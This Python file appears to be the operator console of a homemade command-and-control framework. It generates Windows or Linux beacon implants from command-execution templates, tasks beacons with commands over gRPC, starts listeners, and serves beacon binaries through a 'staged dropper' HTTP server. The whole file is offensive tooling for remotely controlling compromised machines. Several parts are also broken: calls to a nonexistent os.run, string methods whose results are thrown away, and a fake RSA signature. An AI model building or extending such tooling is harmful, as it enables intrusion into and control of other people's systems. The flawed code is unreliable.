import subprocess
import Functemplates
import os
import sys
import grpc
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2
import random
import string


def messageSign(message, n=2345, d=7456654):
    # RSA sign the message
    from hashlib import sha512
    message = message.encode()
    hash1 = int.from_bytes(sha512(message).digest(), byteorder='big')
    signature = pow(hash1, n, d)
    return hex(signature)


def randomword(length):
    letters = string.ascii_lowercase

    return ''.join(random.choice(letters) for i in range(length))


class UnaryClient(object):
    """
    Client for gRPC functionality
    """

    def __init__(self):
        self.host = 'localhost'
        self.server_port = 50051

        # instantiate a channel
        self.channel = grpc.insecure_channel(
            '{}:{}'.format(self.host, self.server_port))

        # bind the client and the server
        self.stub = pb2_grpc.UnaryStub(self.channel)

    def get_url(self, message, beaconID, opt):
        """
        Client function to call the rpc for GetServerResponse
        """
        message = pb2.Message(bID=beaconID, message=message, opt=opt)
        print(f'{message}')
        return self.stub.GetServerResponse(message)


def BobTheBuilder():
    foodah = randomword(10)

    buildmeabeacon = input("Are we building Win or Nix? >")

    buildmeabeacon.lower()

    if buildmeabeacon == "win":
        func1 = Functemplates.WINCMDEXEC
        func1.replace("GENERATEFUNC1", foodah)
        func2 = Functemplates.BASE
        func2.replace("GENERATEFUNC1", foodah)
        with open("out.py", 'w') as f:
            f.write(Functemplates.WINCMDEXEC + '\n' + Functemplates.BASE)
    if buildmeabeacon == "nix":
        func1 = Functemplates.NIXCMDEXEC
        func1.replace("GENERATEFUNC1", foodah)
        func2 = Functemplates.BASE
        func2.replace("GENERATEFUNC1", foodah)
        with open("out.py", "w") as f:
            f.write(Functemplates.NIXCMDEXEC + '\n' + Functemplates.BASE)


def FarmerPickles(PyFileName):
    buildmeaexe = input("Are we building a bin or an exe? >")

    buildmeaexe.lower()

    if buildmeaexe == "bin":
        os.run(f"cython {PyFileName}.py --embed")
        PYTHONLIBVER = sys.version_info[:2]
        os.run(
            f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")


def SendCommand():
    '''
    This uses gRPC to talk with the C2
    We take the command to run and the beaconID to update and write it to the beacons file
    The C2 awaits the POST response and then sends that back over here
    :param command: The command to run
    :param beaconID: The beacon we want to target
    :return: Get the result of the command
    '''
    # Outstanding bugs:
    # strings must be encoded before hashing
    # Should be fixed with UTF-8 encoding
    beaconID = input("Input beacon ID > ")
    command = input("If setting new command > ")
    command = command #+ ";" + messageSign(command)
    opt = input("Get Results (GR) or Set Command (SC) > ")
    client = UnaryClient()
    result = client.get_url(message=command, beaconID=beaconID, opt=opt)
    print(f'{result}')


def startListener():
    subprocess.Popen('tls-listener.py', close_fds=True)


def startMTLS():
    subprocess.Popen('systemctl start nginx', close_fds=True)


def stagedDropper(beacon):
    # Get the bytes value of our beacon
    # Write the bytes to an html file
    # Host it with python? or flask?
    # Dropper grabs the bytes and writes to disk
    with open(beacon, "rb") as fin, open('index.html', 'wb') as fout:
        fout.write(fin.read())
    subprocess.Popen('python -m http.server', close_fds=True)


if __name__ == '__main__':
    # Let's replace this... https://learnpython.com/blog/python-match-case-statement/
    while 1:
        choice = input("Generate a new beacon (1) "
                       "or interact with beacons (2) "
                       "or start listeners (3) "
                       "or run nginx (4) "
                       "or start a staged dropper (5) > ")
        if choice == '1':
            BobTheBuilder()
        if choice == '2':
            SendCommand()
        if choice == '3':
            startListener()
        if choice == '4':
            startMTLS()
        if choice == '5':
            bacon = input('Enter beacon name > ')
            stagedDropper(bacon)
